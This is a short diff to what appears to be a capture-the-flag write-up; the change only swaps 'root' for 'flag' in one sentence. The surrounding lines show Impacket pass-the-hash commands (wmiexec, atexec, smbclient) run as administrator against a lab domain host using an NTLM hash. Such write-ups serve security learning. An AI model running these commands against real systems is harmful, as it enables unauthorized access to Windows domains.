@@ -494,7 +494,7 @@ wmiexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf31
 atexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36 "whoami"
 ```
 
-Finally i gave up and used smbclient to be able to read the C$ Share and get the root that way -_- :
+Finally i gave up and used smbclient to be able to read the C$ Share and get the flag that way -_- :
 
 ```bash
 smbclient.py -hashes :d5cad8a9782b2879bf316f56936f1e36 administrator@10.1.26.225
